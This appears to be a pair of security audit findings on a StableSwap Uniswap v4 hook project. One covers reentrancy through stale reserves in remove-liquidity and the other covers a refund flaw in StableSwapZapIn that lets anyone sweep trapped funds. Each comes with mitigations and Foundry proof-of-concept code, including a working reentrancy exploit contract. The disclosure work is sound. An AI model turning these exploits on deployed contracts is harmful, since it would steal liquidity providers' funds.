# Title
Non-Atomic reserve updates enable cross function reentrancy and pool draining

## Summary
The `StableSwapHooks implementation` specifically in `Liquidity.sol` violates the CEI pattern. In the `_handleRemoveLiquidityCallback` function, the contract performs external interactions with the PoolManager to transfer assets to the user before updating its internal reserve state.

This creates a "stale state" window. When native ETH is involved, the `PoolManager.take()` call triggers the receiver's `receive()` or `fallback()` function. A malicious contract can re-enter the Hook via `manager.swap()` during this window. Since the Hook still reads the old(higher) reserve values, the `StableSwap` invariant math fails to account for the ongoing withdrawal, allowing the attacker to execute swaps with artificially low price impact.

**Exploit Path:**
1. Preparation: Attacker provides liquidity to the pool(i.e a pool with 10k ETH and 10k MockToken).
2. Trigger: Attacker calls `removeLiquidity` for their entire position.
3. Broken Interaction: The Hook enters a loop to process currencies. It calls `poolManager.take(nativeEth, attacker, 5000 ETH)`.
4. Reentrancy:
    - The PoolManager transfers 5,000 ETH to the attacker contract.
    - The attacker’s `receive()` function is triggered.
5. Stale State: At this exact moment, the attacker has the 5,000 ETH, but the Hook’s reserves[0] still shows 15,000 ETH (Initial + Attacker deposit).
6. The Theft: Inside the `receive()`, the attacker calls `manager.swap()` to trade MockTokens for the remaining ETH in the pool.
7. Invariant Manipulation: The Hook's beforeSwap uses the stale 15,000 reserve value. The `StableSwap` math treats the pool as being much deeper than it actually is, resulting in a highly discounted swap price for the attacker.
8. Finalization: The re-entrant swap completes, and only then does the original `removeLiquidity` loop finish and decrement the reserves, but the value is already drained.

```solidity
// Liquidity::_handleRemoveLiquidityCallback

// @Bug Interaction happens before state update (reserves)
for (uint256 i = 0; i < currenciesLength; ++i) {
    if (amounts[i] < minAmounts[i]) revert InsufficientAmounts();

    Currency currency = currencies[i];
    poolManager.burn(address(this), currency.toId(), amounts[i]);
    
    // EXTERNAL INTERACTION: Control flow handed to attacker here
    poolManager.take(currency, sender, amounts[i]); 

    // EFFECT: This update happens TOO LATE
    reserves[i] -= amounts[i]; 
}
```

[Code Reference](https://github.com/revert-finance/stableswap-hooks/blob/cf0c30e576f144809df9819f4d3ad49e0b7fe2d7/src/Liquidity.sol#L200-L211)

## Impact

**Severity: High**
- Attackers can drain the majority of the pool's assets by trading against "ghost liquidity." This leads to irreversible loss of funds for all Liquidity Providers.
- The fundamental StableSwap mathematical formula is rendered useless. By preventing the reserve state from updating, the attacker forces the pool to provide a near-linear exchange rate even when the pool is actually depleted.

**Likelihood: High**
- The Hook does not implement its own reentrancy guard, and the developers mistakenly relied on the PoolManager lock, which only prevents nested unlock calls but allows nested actions like swap.
- The exploit path does not require complex conditions; a simple smart contract can trigger and execute the drain in a single atomic transaction.

## Mitigation
Strictly follow the CEI pattern. Decrement the reserves and totalSupply before calling `poolManager.take()`.

## POC

We are using `test/scenarios/NativeEthMockERC20Pool.t.sol` as our base so change `setup()` in this test suite to `virtual override` from `override`.

Make a new folder in `stableswap-hooks/test/scenarios`

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.30;

import {NativeEthMockERC20Test} from "test/scenarios/NativeEthMockERC20Pool.t.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {StableSwapHooks} from "src/StableSwapHooks.sol";
import {IStableSwapHooks} from "src/interfaces/IStableSwapHooks.sol";
import {BalanceDelta, BalanceDeltaLibrary} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import "forge-std/console.sol";

contract ReentrancyExploitTest is NativeEthMockERC20Test {
    ExploitContract internal exploiter;

    function setUp() public override {
        super.setUp();
        exploiter = new ExploitContract(address(poolManager), address(hooks), address(token));
    }

    function test_PoC_CrossFunctionReentrancy_StaleReserves() public {
        uint256 attackAmount = 5_000 ether;
        vm.deal(address(exploiter), attackAmount);
        token.mint(address(exploiter), attackAmount);

        exploiter.addInitialLiquidity(attackAmount);
        uint256 attackerShares = hooks.balanceOf(address(exploiter));

        // Give the attacker tokens for the swap part of the exploit
        // Swap re-entry needs tokens to settle the debt
        token.mint(address(exploiter), 5000 ether);

        console.log("--- Starting Exploit ---");
        exploiter.executeExploit(attackerShares);
        console.log("--- Exploit Finished ---");

        uint256 attackerEth = address(exploiter).balance;
        console.log("Attacker ETH Balance After Exploit:", attackerEth / 1e18);

        assertGt(attackerEth, 5000 ether, "Exploit failed: Attacker didn't drain enough ETH");
    }
}

contract ExploitContract {
    using SafeCast for uint256;
    using SafeCast for int256;

    IPoolManager public manager;
    address public hooks;
    address public token;
    bool public reentered;

    constructor(address _manager, address _hooks, address _token) {
        manager = IPoolManager(_manager);
        hooks = _hooks;
        token = _token;
        IERC20(token).approve(_hooks, type(uint256).max);
        IERC20(token).approve(_manager, type(uint256).max);
    }

    function addInitialLiquidity(uint256 amount) external {
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = amount;
        amounts[1] = amount;
        (bool success,) = hooks.call{value: amount}(
            abi.encodeWithSignature("addLiquidity(uint256[],uint256[],uint256)", amounts, new uint256[](2), 0)
        );
        require(success, "Add liquidity failed");
    }

    function executeExploit(uint256 shares) external {
        uint256[] memory minAmounts = new uint256[](2);
        (bool success,) = hooks.call(abi.encodeWithSignature("removeLiquidity(uint256,uint256[])", shares, minAmounts));
        require(success, "Exploit call failed");
    }

    receive() external payable {
        if (!reentered && msg.sender == address(manager)) {
            reentered = true;

            // Proof of Bug(Log ---> 15000 vs 5000)
            console.log("--- REENTRANCY HIT ---");
            console.log("Actual ETH received in ExploitContract:", msg.value / 1e18);

            PoolKey memory key = PoolKey({
                currency0: Currency.wrap(address(0)),
                currency1: Currency.wrap(token),
                fee: 300,
                tickSpacing: 1,
                hooks: IHooks(hooks)
            });

            // Swap and get delta
            // Swap function returns token0 and token1 moved
            BalanceDelta swapDelta = manager.swap(
                key,
                SwapParams({
                    zeroForOne: false, // Token --> ETH
                    amountSpecified: -4000 ether,
                    sqrtPriceLimitX96: TickMath.MAX_SQRT_PRICE - 1
                }),
                ""
            );

            // Settle Delta
            _handleDelta(key.currency0, swapDelta.amount0());
            _handleDelta(key.currency1, swapDelta.amount1());
        }
    }

    // Helper to settle deltas
    function _handleDelta(Currency currency, int128 delta) internal {
        if (delta < 0) {
            // Negative delta = We owe the manager (Settle)
            uint256 amountToPay = uint256(int256(-delta));
            if (currency.isAddressZero()) {
                manager.settle{value: amountToPay}();
            } else {
                manager.sync(currency);
                IERC20(Currency.unwrap(currency)).transfer(address(manager), amountToPay);
                manager.settle();
            }
        } else if (delta > 0) {
            // Positive delta = Manager owes us (Take)
            // In V4, an amount of 0 means "Take the entire credit"
            manager.take(currency, address(this), uint256(int256(delta)));
        }
    }
}

```

# Title
Permissionless extraction of trapped assets via faulty refund accounting

## Summary
The `StableSwapZapIn` periphery contract contains a critical accounting flaw in its refund logic. The contract relies on the global `balanceOf(address(this))` to determine "leftover" tokens to be returned to the caller, rather than tracking the specific delta of funds provided by the user during the transaction.

As a result, any assets previously trapped in the contract(due to accidental direct transfers or residual dust from prior transactions) can be permissionlessly extracted by any caller. An attacker can trigger this by calling `zapIn` with a negligible(1-wei) input, effectively "sweeping" the contract's entire balance to their own wallet.

**Exploit Path:**
1. The `StableSwapZapIn` contract holds 1,000 USDC(trapped due to a user's accidental direct transfer).
2. An attacker calls `zapIn()` targeting a pool containing USDC.
3. The attacker provides 1 wei of any other pool token (i.e. WETH) and 0 for USDC.
4. Accounting Failure:
    - The contract's USDC balance is now 1,000 USDC.
    - `zapIn` executes `_addLiquidityAndGetShares`. Since the attacker provided only 1 wei of WETH, the hook consumes nearly 0 USDC to maintain pool proportions.
    - `_refundLeftovers` is called. It queries `balanceOf(address(this))` for USDC, which returns 1,000 USDC.
5. The contract transfers the entire 1,000 USDC to the attacker (msg.sender) as a "refund."

In `StableSwapZapIn.sol`, the `_refundLeftovers` function captures the entire contract balance:
```solidity
function _refundLeftovers(Currency[] memory _currencies, uint256[] calldata _amounts)
    internal
    returns (uint256[] memory usedAmounts)
{
    // loop starts
    if (currency.isAddressZero()) {
        leftover = address(this).balance;
    } else {
        leftover = IERC20(Currency.unwrap(currency)).balanceOf(address(this)); // @Bug: Captures total balance
    }

    // ...
    if (leftover > 0) {
        if (currency.isAddressZero()) {
            Address.sendValue(payable(msg.sender), leftover); // @Bug: Sends everything to msg.sender
        } else {
            IERC20(Currency.unwrap(currency)).safeTransfer(msg.sender, leftover);
        }
    }
}
```
[Code Reference](https://github.com/revert-finance/stableswap-hooks/blob/cf0c30e576f144809df9819f4d3ad49e0b7fe2d7/src/periphery/StableSwapZapIn.sol#L447-L473)

## Impact

**Severity:Medium**
- Direct Loss of Assets: All funds residing in the periphery contract are at risk of immediate theft.
- Permissionless Exploitation: The vulnerability can be exploited by anyone via public functions.
- Broken Invariant: The contract violates the core periphery principle that `User_Refund <= User_Input + Swap_Output`.

**Likelihood:Medium**
- It is a common occurrence for users to mistakenly send funds to periphery addresses or for dust to accumulate over time.

## Mitigation
The contract must transition from "Raw Balance Accounting" to "Delta-Based Accounting." Snapshots of the contract's balance should be taken before pulling user funds to ensure only the surplus from the current transaction is refunded.

```solidity
// Inside zapIn or a similar wrapper
uint256 balanceBefore = IERC20(token).balanceOf(address(this));
_transferTokensFromUser(...);
// ... execution logic ...
uint256 balanceAfter = IERC20(token).balanceOf(address(this));

// Ensure only the difference(if any) is considered for a refund
uint256 actualUserSurplus = balanceAfter > balanceBefore ? balanceAfter - balanceBefore : 0;
```

## POC

Paste this test in `stableswap-hooks/test/StableSwapZapIn.t.sol`

```solidity
    function test_zapIn_stealTrappedFunds_RefundVersion() public {
        // Initialize pool
        _addLiquidity(1000, 1000);

        // Setup trapped funds
        uint256 trappedAmount = _toTokenWei(currency0, 1000);
        deal(Currency.unwrap(currency0), address(zapIn), trappedAmount);

        address attacker = makeAddr("attacker");
        uint256 dustInput = 1;
        deal(Currency.unwrap(currency1), attacker, dustInput);

        vm.startPrank(attacker);
        IERC20(Currency.unwrap(currency1)).forceApprove(address(zapIn), dustInput);

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 0;
        amounts[1] = dustInput;

        uint256 balanceBefore = IERC20(Currency.unwrap(currency0)).balanceOf(attacker);

        //Exploit call
        zapIn.zapIn(address(hooks), amounts, new Swap[](0), 0);

        uint256 balanceAfter = IERC20(Currency.unwrap(currency0)).balanceOf(attacker);
        // Allow for a tiny bit consumed by the 1-wei liquidity addition
        // 1e12 is the proportional amount for 1 unit of 6-decimal token in 18-decimal terms
        assertApproxEqAbs(
            balanceAfter - balanceBefore,
            trappedAmount,
            1e12,
            "Attacker should have stolen effectively all trapped funds"
        );

        // Prove the attacker also got LP shares for the 'missing' part
        assertGt(hooks.balanceOf(attacker), 0, "Attacker also stole part of funds as LP shares");

        vm.stopPrank();
    }
```

